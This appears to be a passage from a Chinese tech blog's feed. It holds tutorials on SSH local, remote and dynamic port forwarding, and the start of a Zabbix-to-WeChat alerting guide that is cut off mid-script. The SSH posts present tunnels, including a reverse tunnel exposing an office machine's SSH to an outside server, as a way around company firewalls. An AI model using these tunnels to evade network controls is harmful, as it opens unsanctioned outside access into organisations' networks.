<p>即使在ServerB中执行上述命令时指定了IP或者开启了网关功能，ServerA的9906端口仍然只监听在127.0.0.1上，当然，如果你一心想要通过别的主机访问ServerA的9906端口，也可以使用其他程序去反代ServerA的9906端口，还有，我在实际的使用过程中，如果使用远程转发穿透到内网，ssh隧道将会非常不稳定，隧道会莫名其妙的消失或者失效，特别是在没有固定IP的网络内，网上有些朋友提供了autossh的解决方案，不过我并没有尝试过，如果你有兴趣，可以试一试。</p>
<h2 id="本地转发与远程转发的区别"><a href="#本地转发与远程转发的区别" class="headerlink" title="本地转发与远程转发的区别"></a>本地转发与远程转发的区别</h2><p>读到此处，你可能会有些蒙圈，”远程转发”与”本地转发”到底有什么不一样，我们来对比一下</p>
<p>在对比之前，再强调一点，我们把执行创建隧道命令的主机称为本地主机(本地)。</p>
<p><strong>“本地转发”</strong></p>
<p>在本机执行创建隧道的命令时，本地是ssh客户端，隧道的另一头是远程主机(ssh服务端)，本地主机(也就是ssh客户端)会监听一个端口，当访问本地主机的这个端口时，通讯数据会通过ssh隧道转发到ssh服务端(即远程主机)，远程主机再将通讯数据发往应用服务所监听端口，在本地转发中，本地主机不仅扮演了ssh客户端的角色，也扮演了应用程序的客户端(比如mysql客户端)，远程主机不仅扮演了ssh服务端，也扮演了应用程序服务端(比如mysql服务端)，那么我们可以总结一下，本地转发的特性如下</p>
<p>本地主机：隧道的一头，本地主机既是ssh客户端，又是应用客户端</p>
<p>远程主机：隧道的另一头，远程主机既是ssh服务端，又是应用服务端</p>
<p>隧道创建以后，转发端口监听在本地主机中，即监听在ssh客户端主机中。</p>
<p><strong>“远程转发”</strong></p>
<p>在本机执行创建隧道的命令时，本地是ssh客户端，隧道的另一头是远程主机(ssh服务端)，远程主机(也就是ssh服务端)会监听一个端口，当访问远程主机的这个端口时，通讯数据会通过ssh隧道转发到ssh客户端(即本地主机)，本地主机再将通讯数据发往应用服务所监听端口，在远程转发中，本地主机不仅扮演了ssh客户端的角色，也扮演了应用程序的服务端(比如mysql服务端)，远程主机不仅扮演了ssh服务端，也扮演了应用程序客户端(比如mysql客户端)，那么我们可以总结一下，远程转发的特性如下</p>
<p>本地主机：隧道的一头，本地主机既是ssh客户端，又是应用服务端</p>
<p>远程主机：隧道的另一头，远程主机既是ssh服务端，又是应用客户端</p>
<p>隧道创建以后，转发端口监听在远程主机中，即监听在ssh服务端主机中。</p>
<p>“本地转发”与”远程转发”都属于ssh端口转发，也可以称呼它们为”ssh隧道”，只不过，有的朋友喜欢将”远程转发”称呼为为”ssh反向隧道”或者”ssh逆向隧道”</p>
<p>经过上述描述，我想你应该已经明白了它们之间的区别。</p>
<h2 id="一些扩展"><a href="#一些扩展" class="headerlink" title="一些扩展"></a>一些扩展</h2><p>在之前的示例中，ServerB是ssh隧道的一头，同时，ServerB也是应用的服务端，也就是说，应用程序的服务端与ssh隧道的连接端在同一台服务器上，那么，当应用程序的服务端处于其他主机时（比如ServerC），我们还能够通过ServerB去转发通讯数据吗？我们来动手试试，不过在动手之前，先来描述一下实验场景，实验场景如下图所示</p>
<p><img src="/articles/b406f6c6/12.png" alt="ssh端口转发：ssh隧道"></p>
<p>如上图所示，我们想要在A与B之间创建隧道，最终通过隧道访问到ServerC中的mysql服务。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ServerAIP：10.1.0.1</span><br><span class="line"></span><br><span class="line">ServerBIP：10.1.0.2</span><br><span class="line"></span><br><span class="line">ServerCIP：10.1.0.3</span><br><span class="line"></span><br><span class="line">ServerA与ServerB上没有开启任何mysql服务。</span><br><span class="line"></span><br><span class="line">ServerC中开启了mysql服务，监听了3306端口。</span><br></pre></td></tr></table></figure>

<p>之前用于示例所创建的ssh隧道已经全部关闭，相当于一个全新的实验环境。</p>
<p>好了，实验环境描述完毕，现在开始实际操作，就以本地转发为例，在ServerA中执行如下命令，即可创建一条隧道并满足上图中的应用场景。</p>
<p><img src="/articles/b406f6c6/13.png" alt="ssh端口转发：ssh隧道"></p>
<p>如上图所示，ServerA的9906端口已经被监听，细心如你一定发现了，上图中的命令与之前创建隧道时所使用的命令在结构上并没有什么不同，只是目标端口所对应的IP地址变为了ServerC的IP，是不是很简单，我再来啰嗦一遍，上述命令表示，从本机（ServerA）建立一条ssh隧道连接到10.1.0.2（ServerB），隧道使用本地转发模式建立，转发端口监听在本地的9906端口上，访问本机的9906端口时，数据会被ssh隧道转发到10.1.0.3（ServerC)的3306端口。</p>
<p>我们来测试一下实际的使用效果，如下图所示，一切正常。</p>
<p><img src="/articles/b406f6c6/14.png" alt="ssh端口转发：ssh隧道"></p>
<p>上述场景中存在一个问题，就是数据安全性的问题，我们之所以使用ssh隧道，就是为了用它来保护明文传输的数据，从而提升安全性，不过，在上例的场景中，只有ServerA与ServerB之间的传输是受ssh隧道保护的，ServerB与ServerC之间的传输，仍然是明文的，所以，如果想要在上述场景中使用ssh隧道进行数据转发，首先要考虑ServerB与ServerC之间的网络是否可靠。</p>
<p>其实，当我们在创建隧道时如果开启了网关功能，那么应用客户端与ServerA之间的通讯也会面临同样的问题，如下图所示</p>
<p><img src="/articles/b406f6c6/15.png" alt="ssh端口转发：ssh隧道"></p>
<p>既然上述场景中存在没有办法通过ssh隧道保护的连接，那么为什么还要使用上述方式进行转发呢？</p>
<p>这是因为，在某些实际的使用场景中，我们使用ssh隧道的目的并不是提升数据的安全性，而是为了”绕过防火墙”，比如如下场景</p>
<p><img src="/articles/b406f6c6/16.png" alt="ssh端口转发：ssh隧道"></p>
<p>上图中，ServerC中提供了mysql服务，我们想要通过ServerA访问ServerC中的mysql服务，但是，ServerA与ServerC之间存在防火墙，阻断了它们的通讯，所以，我们无法从ServerA中直接访问ServerC中的服务，不过幸运的是，我们还有另外一台机器：ServerB，ServerA与ServerB之间可以自由通讯，同时，ServerB与ServerC之间也可以自由通讯，没错，你一定想到了，我们可以利用ServerB，在ServerA与ServerB之间建立ssh隧道，达到我们的最终目的：使得ServerA可以访问到ServerC中的mysql服务，如下图所示</p>
<p><img src="/articles/b406f6c6/17.png" alt="ssh端口转发：ssh隧道"></p>
<p>当上图中的ssh隧道建立以后，访问ServerA中的转发端口，即可访问到ServerC中的mysql服务，因为对于ServerC来说，ServerA是透明的，ServerC并不知道ServerA的存在，它只能看到ServerB，当你在ServerA中使用ssh隧道访问ServerC的mysql服务时，如果你在ServerC中的网卡上进行抓包，只会看到ServerB的IP地址，因为数据经过ServerB转发了。</p>
<h2 id="一些配置"><a href="#一些配置" class="headerlink" title="一些配置"></a>一些配置</h2><p>其实，如果想要能够正常的使用ssh端口转发，我们还需要做出正确的配置才行，之前一直没有说明，是因为openssh默认的配置就是支持端口转发的。</p>
<p>如果想要ssh端口转发能够正常工作，需要在ssh服务端的配置文件中将AllowTcpForwarding的值设置为yes。</p>
<p>此处所指的ssh服务端即ssh隧道中的一头，扮演ssh服务端角色的那台主机。</p>
<p>当隧道建立以后，经过一段时间后，ssh隧道链接可能会被断开，这有可能是因为ssh客户端和ssh服务端长时间没有通讯，于是ssh服务端主动断开了链接，如果想要解决这个问题，可以在ssh服务端进行配置，调整ssh服务端的ClientAliveInterval配置和ClientAliveCountMax配置即可。</p>
<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>经过上述描述，我想你应该已经了解的ssh隧道的作用。</p>
<p>通常，ssh隧道可以帮助我们达到如下目的：</p>
<p>1、保护tcp会话，保护会话中明文传输的内容。</p>
<p>2、绕过防火墙或者穿透到内网，访问对应的服务。</p>
<p>为了以后方便回顾，我们将上文中使用到的命令及选项进行总结</p>
<p>创建隧道时的常用选项有：</p>
<p>“-L选项”：表示使用本地端口转发创建ssh隧道</p>
<p>“-R选项”：表示使用远程端口转发创建ssh隧道</p>
<p>“-N选项”： 表示创建隧道以后不连接到sshServer端，通常与”-f”选项连用</p>
<p>“-f选项”：表示在后台运行ssh隧道，通常与”-N”选项连用</p>
<p>“-g选项”：表示ssh隧道对应的转发端口将监听在主机的所有IP中，不使用”-g选项”时，转发端口默认只监听在主机的本地回环地址中，”-g”表示开启网关模式，远程端口转发中，无法开启网关功能。</p>
<p>创建本地转发模式的ssh隧道，命令如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh -g -f -N -L forwardingPort:targetIP:targetPort user@sshServerIP</span><br></pre></td></tr></table></figure>

<p>本机上的forwardingPort将会被监听，访问本机的forwardingPort，就相当于访问targetIP的targetPort，ssh隧道建立在本机与sshServer之间。</p>
<p>创建远程转发模式的ssh隧道，命令如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh -f -N -R forwardingPort:targetIP:targetPort user@sshServerIP</span><br></pre></td></tr></table></figure>

<p>sshServer上的forwardingPort将会被监听，访问sshServer上的forwardingPort，就相当于访问targetIP的targetPort，ssh隧道建立在本机与sshServer之间。</p>
<p>关于ssh的端口转发就总结到这里，希望可以帮助到你。</p>
]]></content>
      <categories>
        <category>网络技术</category>
      </categories>
      <tags>
        <tag>Network</tag>
      </tags>
  </entry>
  <entry>
    <title>SSH隧道与端口转发及内网穿透</title>
    <url>/articles/95ca2546.html</url>
    <content><![CDATA[<h2 id="SSH隧道与端口转发及内网穿透"><a href="#SSH隧道与端口转发及内网穿透" class="headerlink" title="SSH隧道与端口转发及内网穿透"></a>SSH隧道与端口转发及内网穿透</h2><p>大家都知道SSH是一种安全的传输协议，用在连接服务器上比较多。不过其实除了这个功能，它的隧道转发功能更是吸引人。下面是个人根据自己的需求以及在网上查找的资料配合自己的实际操作所得到的一些心得。</p>
<p><strong>SSH/plink命令的基本资料：</strong></p>
<p>首先，认识下这三个非常强大的命令：</p>
<blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt; ssh -C -f -N -g -L listen_port:DST_Host:DST_port user@Tunnel_Host</span><br><span class="line">&gt; ssh -C -f -N -g -R listen_port:DST_Host:DST_port user@Tunnel_Host</span><br><span class="line">&gt; ssh -C -f -N -g -D listen_port user@Tunnel_Host</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
</blockquote>
<p>相关参数的解释：</p>
<p>-f Fork into background after authentication.<br>后台认证用户/密码，通常和-N连用，不用登录到远程主机。</p>
<p>-L port:host:hostport<br>将本地机(客户机)的某个端口转发到远端指定机器的指定端口. 工作原理是这样的, 本地机器上分配了一个 socket 侦听 port 端口, 一旦这个端口上有了连接, 该连接就经过安全通道转发出去, 同时远程主机和 host 的 hostport 端口建立连接. 可以在配置文件中指定端口的转发. 只有 root 才能转发特权端口. IPv6 地址用另一种格式说明: port/host/hostport</p>
<p>-R port:host:hostport<br>将远程主机(服务器)的某个端口转发到本地端指定机器的指定端口. 工作原理是这样的, 远程主机上分配了一个 socket 侦听 port 端口, 一旦这个端口上有了连接, 该连接就经过安全通道转向出去, 同时本地主机和 host 的 hostport 端口建立连接. 可以在配置文件中指定端口的转发. 只有用 root 登录远程主机才能转发特权端口. IPv6 地址用另一种格式说明: port/host/hostport</p>
<p>-D port<br>指定一个本地机器 “动态的’’ 应用程序端口转发. 工作原理是这样的, 本地机器上分配了一个 socket 侦听 port 端口, 一旦这个端口上有了连接, 该连接就经过安全通道转发出去, 根据应用程序的协议可以判断出远程主机将和哪里连接. 目前支持 SOCKS4 协议, 将充当 SOCKS4 服务器. 只有 root 才能转发特权端口. 可以在配置文件中指定动态端口的转发.</p>
<p>-C Enable compression.<br>压缩数据传输。</p>
<p>-N Do not execute a shell or command.<br>不执行脚本或命令，通常与-f连用。</p>
<p>-g Allow remote hosts to connect to forwarded ports.<br>在-L/-R/-D参数中，允许远程主机连接到建立的转发的端口，如果不加这个参数，只允许本地主机建立连接。注：这个参数我在实践中似乎始终不起作用。</p>
<a id="more"></a>

<p><strong>建立本地SSH隧道例子</strong></p>
<p>在我们计划建立一个本地SSH隧道之前，我们必须清楚下面这些数据：</p>
<ol>
<li><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1. 中间服务器d的IP地址</span><br><span class="line">2. 要访问服务器c的IP地址</span><br><span class="line">3. 要访问服务器c的端口</span><br></pre></td></tr></table></figure>

</li>
</ol>
<p>现在，我们把上面这张图变得具体一些，给这些机器加上IP地址。并且根据下面这张图列出我们的计划：</p>
<ol>
<li><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1. 需要访问234.234.234.234的FTP服务，也就是端口21</span><br><span class="line">2. 中间服务器是123.123.123.123</span><br></pre></td></tr></table></figure>

</li>
</ol>
<p>现在我们使用下面这条命令来达成我们的目的</p>
<blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt; ssh -N -f -L 2121:234.234.234.234:21 123.123.123.123</span><br><span class="line">&gt; ftp localhost:2121 # 现在访问本地2121端口，就能连接234.234.234.234的21端口了</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
</blockquote>
<p>这里我们用到了SSH客户端的三个参数，下面我们一一做出解释：</p>
<ul>
<li>-N 告诉SSH客户端，这个连接不需要执行任何命令。仅仅做端口转发</li>
<li>-f 告诉SSH客户端在后台运行</li>
<li>-L 做本地映射端口，被冒号分割的三个部分含义分别是<ul>
<li>需要使用的本地端口号</li>
<li>需要访问的目标机器IP地址（IP: 234.234.234.234）</li>
<li>需要访问的目标机器端口（端口: 21)</li>
</ul>
</li>
<li>最后一个参数是我们用来建立隧道的中间机器的IP地址(IP: 123.123.123.123)</li>
</ul>
<p>我们再重复一下-L参数的行为。-L X:Y:Z的含义是，将IP为Y的机器的Z端口通过中间服务器映射到本地机器的X端口。</p>
<p>在这条命令成功执行之后，我们已经具有绕过公司防火墙的能力，并且成功访问到了我们喜欢的一个FTP服务器了。</p>
<h5 id="如何建立远程SSH隧道"><a href="#如何建立远程SSH隧道" class="headerlink" title="如何建立远程SSH隧道"></a>如何建立远程SSH隧道</h5><p>通过建立本地SSH隧道，我们成功地绕过防火墙开始下载FTP上的资源了。那么当我们在家里的时候想要察看下载进度怎么办呢？大多数公司的网络是通过路由器接入互联网的，公司内部的机器不会直接与互联网连接，也就是不能通过互联网直接访问。通过线路D-B-A访问公司里的机器a便是不可能的。也许你已经注意到了，虽然D-B-A这个方向的连接不通，但是A-B-D这个方向的连接是没有问题的。那么，我们能否利用一条已经连接好的A-B-D方向的连接来完成D-B-A方向的访问呢？答案是肯定的，这就是远程SSH隧道的用途。</p>
<p>与本地SSH一样，我们在建立远程SSH隧道之前要清楚下面几个参数：</p>
<ul>
<li>需要访问内部机器的远程机器的IP地址（这里是123.123.123.123）</li>
<li>需要让远程机器能访问的内部机器的IP地址(这里因为是想把本机映射出去，因此IP是127.0.0.1)</li>
<li>需要让远程机器能访问的内部机器的端口号(端口:22)</li>
</ul>
<p>在清楚了上面的参数后，我们使用下面的命令来建立一个远程SSH隧道</p>
<blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt; ssh -N -f -R 2222:127.0.0.1:22 123.123.123.123</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
</blockquote>
<p>现在，在IP是123.123.123.123的机器上我们用下面的命令就可以登陆公司的IP是192.168.0.100的机器了。</p>
<blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt; ssh -p 2222 localhost</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
</blockquote>
<p>-N，-f 这两个参数我们已经在本地SSH隧道中介绍过了。我们现在重点说说参数-R。该参数的三个部分的含义分别是:</p>
<ul>
<li>远程机器使用的端口（2222）</li>
<li>需要映射的内部机器的IP地址(127.0.0.1)</li>
<li>需要映射的内部机器的端口(22)</li>
</ul>
<p>例如：-R X:Y:Z 就是把我们内部的Y机器的Z端口映射到远程机器的X端口上。</p>
<p><strong>建立SSH隧道的几个技巧</strong></p>
<p><strong>自动重连</strong></p>
<p>隧道可能因为某些原因断开，例如：机器重启，长时间没有数据通信而被路由器切断等等。因此我们可以用程序控制隧道的重新连接，例如一个简单的循环或者使用 <a href="http://cr.yp.to/daemontools.html" target="_blank" rel="noopener">djb’s daemontools</a> . 不管用哪种方法，重连时都应避免因输入密码而卡死程序。关于如何安全的避免输入密码的方法，请参考我的 <a href="http://blog.jianingy.com/node/73" target="_blank" rel="noopener">如何实现安全的免密码ssh登录</a> 。这里请注意，如果通过其他程序控制隧道连接，应当避免将SSH客户端放到后台执行，也就是去掉-f参数。</p>
<p><strong>保持长时间连接</strong></p>
<p>有些路由器会把长时间没有通信的连接断开。SSH客户端的TCPKeepAlive选项可以避免这个问题的发生，默认情况下它是被开启的。如果它被关闭了，可以在ssh的命令上加上-o TCPKeepAlive=yes来开启。</p>
<p>另一种方法是，去掉-N参数，加入一个定期能产生输出的命令。例如: top或者vmstat。下面给出一个这种方法的例子：</p>
<blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt; ssh -R 2222:localhost:22 123.123.123.123 &quot;vmstat 30&quot;</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
</blockquote>
<p><strong>检查隧道状态</strong></p>
<p>有些时候隧道会因为一些原因通信不畅而卡死，例如：由于传输数据量太大，被路由器带入stalled状态。这种时候，往往SSH客户端并不退出，而是卡死在那里。一种应对方法是，使用SSH客户端的ServerAliveInterval和ServerAliveCountMax选项。 ServerAliveInterval会在隧道无通信后的一段设置好的时间后发送一个请求给服务器要求服务器响应。如果服务器在 ServerAliveCountMax次请求后都没能响应，那么SSH客户端就自动断开连接并退出，将控制权交给你的监控程序。这两个选项的设置方法分别是在ssh时加入-o ServerAliveInterval=n和-o ServerAliveCountMax=m。其中n, m可以自行定义。</p>
<p><strong>如何将端口绑定到外部地址上</strong></p>
<p>使用上面的方法，映射的端口只能绑定在127.0.0.1这个接口上。也就是说，只能被本机自己访问到。如何才能让其他机器访问这个端口呢？我们可以把这个映射的端口绑定在0.0.0.0的接口上，方法是加上参数-b 0.0.0.0。同时还需要打开SSH服务器端的一个选项－GatewayPorts。默认情况下它应当是被打开的。如果被关闭的话，可以在/etc /sshd_config中修改GatewayPorts no为GatewayPorts yes来打开它。</p>
<p><strong>通过SSH隧道建立SOCKS服务器</strong></p>
<p>如果我们需要借助一台中间服务器访问很多资源，一个个映射显然不是高明的办法（事实上，高明确实没有用这个方法）。幸好，SSH客户端为我们提供了通过SSH隧道建立SOCKS服务器的功能。</p>
<p>通过下面的命令我们可以建立一个通过123.123.123.123的SOCKS服务器。</p>
<blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt; ssh -N -f -D 1080 123.123.123 # 将端口绑定在127.0.0.1上</span><br><span class="line">&gt; ssh -N -f -D 0.0.0.0:1080 123.123.123.123 # 将端口绑定在0.0.0.0上</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
</blockquote>
<p>通过SSH建立的SOCKS服务器使用的是SOCKS5协议，在为应用程序设置SOCKS代理的时候要特别注意。</p>
]]></content>
      <categories>
        <category>网络技术</category>
      </categories>
      <tags>
        <tag>Network</tag>
      </tags>
  </entry>
  <entry>
    <title>Zabbix Server增加微信告警</title>
    <url>/articles/63c5195d.html</url>
    <content><![CDATA[<h2 id="目的"><a href="#目的" class="headerlink" title="目的"></a>目的</h2><p>微信现在是我们手机中必不可少的软件，通过它可以和朋友亲人聊天视频等。作为运维，让监控系统通过微信报警，及时提醒我们，保证线上服务稳定运行，这是SRE的职责所在。通过本教程学习，让zabbix  server增加微信报警媒介。</p>
<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@p34044v ~]<span class="comment"># cat /etc/redhat-release </span></span><br><span class="line">CentOS Linux release 7.7.1908 (Core)</span><br><span class="line">[root@p34044v ~]<span class="comment"># python -V</span></span><br><span class="line">Python 2.7.5</span><br><span class="line">[root@p34044v ~]<span class="comment"># zabbix_server -V</span></span><br><span class="line">zabbix_server (Zabbix) 4.0.13</span><br><span class="line">Revision 4e383bb6c5 2 October 2019, compilation time: Oct  2 2019 08:45:35</span><br><span class="line"></span><br><span class="line">Copyright (C) 2019 Zabbix SIA</span><br><span class="line">License GPLv2+: GNU GPL version 2 or later &lt;http://gnu.org/licenses/gpl.html&gt;.</span><br><span class="line">This is free software: you are free to change and redistribute it according to</span><br><span class="line">the license. There is NO WARRANTY, to the extent permitted by law.</span><br><span class="line"></span><br><span class="line">This product includes software developed by the OpenSSL Project</span><br><span class="line"><span class="keyword">for</span> use <span class="keyword">in</span> the OpenSSL Toolkit (http://www.openssl.org/).</span><br><span class="line"></span><br><span class="line">Compiled with OpenSSL 1.0.1e-fips 11 Feb 2013</span><br><span class="line">Running with OpenSSL 1.0.1e-fips 11 Feb 2013</span><br><span class="line">[root@p34044v ~]<span class="comment"># zabbix_agentd -V</span></span><br><span class="line">zabbix_agentd (daemon) (Zabbix) 4.0.9</span><br><span class="line">Revision 97a69d5d5a 5 June 2019, compilation time: Jun  7 2019 08:45:50</span><br><span class="line"></span><br><span class="line">Copyright (C) 2019 Zabbix SIA</span><br><span class="line">License GPLv2+: GNU GPL version 2 or later &lt;http://gnu.org/licenses/gpl.html&gt;.</span><br><span class="line">This is free software: you are free to change and redistribute it according to</span><br><span class="line">the license. There is NO WARRANTY, to the extent permitted by law.</span><br><span class="line"></span><br><span class="line">This product includes software developed by the OpenSSL Project</span><br><span class="line"><span class="keyword">for</span> use <span class="keyword">in</span> the OpenSSL Toolkit (http://www.openssl.org/).</span><br><span class="line"></span><br><span class="line">Compiled with OpenSSL 1.0.1e-fips 11 Feb 2013</span><br><span class="line">Running with OpenSSL 1.0.1e-fips 11 Feb 2013</span><br><span class="line">[root@p34044v ~]<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<a id="more"></a>

<h2 id="申请企业微信号"><a href="#申请企业微信号" class="headerlink" title="申请企业微信号"></a>申请企业微信号</h2><h5 id="申请企业号并记录相关信息"><a href="#申请企业号并记录相关信息" class="headerlink" title="申请企业号并记录相关信息"></a>申请企业号并记录相关信息</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">https://qy.weixin.qq.com</span><br><span class="line"></span><br><span class="line">后边需要用到的几个信息：</span><br><span class="line">    1.登录网页 - 我的企业 - 企业ID：xxxxx</span><br><span class="line">        或者：企业微信客户端：工作台 - 管理企业 - 企业信息 - 企业ID</span><br></pre></td></tr></table></figure>

<h5 id="创建应用"><a href="#创建应用" class="headerlink" title="创建应用"></a>创建应用</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">登录网页 - 应用与小程序 - 创建应用。创建完成后记录以下信息：</span><br><span class="line">    AgentId：xxxxx</span><br><span class="line">    Secret：SacUM-xxxxxxxxxx</span><br></pre></td></tr></table></figure>

<h5 id="添加通讯录（添加后才可接受告警消息）"><a href="#添加通讯录（添加后才可接受告警消息）" class="headerlink" title="添加通讯录（添加后才可接受告警消息）"></a>添加通讯录（添加后才可接受告警消息）</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">登录网页 - 通讯录 - 添加成员</span><br></pre></td></tr></table></figure>

<h2 id="设置Python脚本"><a href="#设置Python脚本" class="headerlink" title="设置Python脚本"></a>设置Python脚本</h2><h5 id="安装依赖"><a href="#安装依赖" class="headerlink" title="安装依赖"></a>安装依赖</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yum install -y python-requests</span><br></pre></td></tr></table></figure>

<h5 id="准备Python脚本"><a href="#准备Python脚本" class="headerlink" title="准备Python脚本"></a>准备Python脚本</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">附录内有具体脚本内容，这里是使用Python脚本来实现的。</span><br><span class="line">脚本内有3项内容是必须根据自己情况做修改的。详情请看脚本备注</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1.查看Zabbix Server脚本目录设置</span></span><br><span class="line">[root@localhost ~]<span class="comment"># grep AlertScriptsPath /etc/zabbix/zabbix_server.conf</span></span><br><span class="line"><span class="comment">### Option: AlertScriptsPath</span></span><br><span class="line"><span class="comment"># AlertScriptsPath=$&#123;datadir&#125;/zabbix/alertscripts</span></span><br><span class="line">AlertScriptsPath=/usr/lib/zabbix/alertscripts</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2.编辑Python脚本</span></span><br><span class="line">vim /usr/lib/zabbix/alertscripts/weixin.py</span><br><span class="line">添加附录内脚本内容</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3.给脚本执行权限</span></span><br><span class="line">chmod 755 /usr/lib/zabbix/alertscripts/weixin.py</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4.测试脚本</span></span><br><span class="line">/usr/lib/zabbix/alertscripts/weixin.py name <span class="built_in">test</span> 123456</span><br><span class="line">    name：收件人账号（登录企业微信网站 - 通讯录 - 打开某个收件人 - 账号）</span><br><span class="line">    <span class="built_in">test</span>：标题?</span><br><span class="line">    123456：具体需要发送的内容</span><br><span class="line"></span><br><span class="line">如果没有错误的话，收件人将可以在手机APP企业微信上收到此消息。</span><br></pre></td></tr></table></figure>

<h5 id="手动建立日志文件并赋予写入权限"><a href="#手动建立日志文件并赋予写入权限" class="headerlink" title="手动建立日志文件并赋予写入权限"></a>手动建立日志文件并赋予写入权限</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">因为Python脚本设置了记录日志，但是脚本所在路径隶属于root组</span><br><span class="line">而Zabbix Server是使用zabbix用户运行的，对此目录没有写入权限</span><br><span class="line">所以这里先手动建立一个空的<span class="built_in">log</span>文件，并赋予所有用户写入权限</span><br><span class="line"></span><br><span class="line">touch /usr/lib/zabbix/alertscripts/weixin.log</span><br><span class="line">chmod 766 /usr/lib/zabbix/alertscripts/weixin.log</span><br></pre></td></tr></table></figure>

<h2 id="设置Zabbix-Server开启微信告警"><a href="#设置Zabbix-Server开启微信告警" class="headerlink" title="设置Zabbix Server开启微信告警"></a>设置Zabbix Server开启微信告警</h2><h5 id="添加告警媒介"><a href="#添加告警媒介" class="headerlink" title="添加告警媒介"></a>添加告警媒介</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">管理 - 报警媒介类型 - 创建媒体类型</span><br><span class="line">    名称：微信</span><br><span class="line">    类型：脚本</span><br><span class="line">    脚本名称：weixin.py</span><br><span class="line">    脚本参数：</span><br><span class="line">        &#123;ALERT.SENDTO&#125;</span><br><span class="line">        &#123;ALERT.SUBJECT&#125;</span><br><span class="line">        &#123;ALERT.MESSAGE&#125;</span><br></pre></td></tr></table></figure>

<h5 id="为用户添加报警媒介"><a href="#为用户添加报警媒介" class="headerlink" title="为用户添加报警媒介"></a>为用户添加报警媒介</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">管理 - 用户 - 报警媒介 - 添加</span><br><span class="line">    类型：微信</span><br><span class="line">    收件人：收件人账号（登录企业微信网站 - 通讯录 - 打开某个收件人 - 账号）</span><br><span class="line">    当启用时：1-7,00:00-24:00</span><br><span class="line">    如果存在严重性则使用：根据自己需要选择发送告警类型</span><br><span class="line">    已启用：必须勾选</span><br></pre></td></tr></table></figure>

<h5 id="打开触发器动作"><a href="#打开触发器动作" class="headerlink" title="打开触发器动作"></a>打开触发器动作</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1.管理 - 动作：这里默认是停用状态，需要手动开启</span><br><span class="line"></span><br><span class="line">2.管理 - 动作 - Report problems to Zabbix administrators</span><br><span class="line">    操作 - 编辑：查看【仅送到】选项是否是所有或者微信。</span><br><span class="line">    </span><br><span class="line">    关于这里的操作细节：</span><br><span class="line">    步骤：1-1（假如故障持续了1个小时，它也只发送一次。）</span><br><span class="line">             （如果改成1-0，0是表示不限制.无限发送)</span><br><span class="line">              (发送间隔是下边的【步骤持续时间】）</span><br></pre></td></tr></table></figure>

<h4 id="模拟测试"><a href="#模拟测试" class="headerlink" title="模拟测试"></a>模拟测试</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">将新某台被监控主机关机或zabbix-agentd暂停，查看是否能收到微信告警。</span><br></pre></td></tr></table></figure>

<h2 id="附录：使用普通微信接受消息"><a href="#附录：使用普通微信接受消息" class="headerlink" title="附录：使用普通微信接受消息"></a>附录：使用普通微信接受消息</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">成员无需下载企业微信客户端，直接用微信扫码关注微工作台，即可在微信中接收企业通知和使用企业应用。</span><br><span class="line"></span><br><span class="line">方法：登录企业微信管理页面 - 我的企业 - 微工作台 - 邀请关注的二维码</span><br><span class="line">    关注后即可。</span><br></pre></td></tr></table></figure>

<h2 id="附录：Python脚本内容"><a href="#附录：Python脚本内容" class="headerlink" title="附录：Python脚本内容"></a>附录：Python脚本内容</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#-*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment">#author: 1327133225@qq.com</span></span><br><span class="line"><span class="comment">#date: 2019-01-13</span></span><br><span class="line"><span class="comment">#comment: zabbix接入微信报警脚本</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置记录日志</span></span><br><span class="line">logging.basicConfig(level = logging.DEBUG, format = <span class="string">'%(asctime)s, %(filename)s, %(levelname)s, %(message)s'</span>,</span><br><span class="line">                datefmt = <span class="string">'%a, %d %b %Y %H:%M:%S'</span>,</span><br><span class="line">                filename = os.path.join(<span class="string">'/usr/lib/zabbix/alertscripts'</span>,<span class="string">'weixin.log'</span>),</span><br><span class="line">                filemode = <span class="string">'a'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 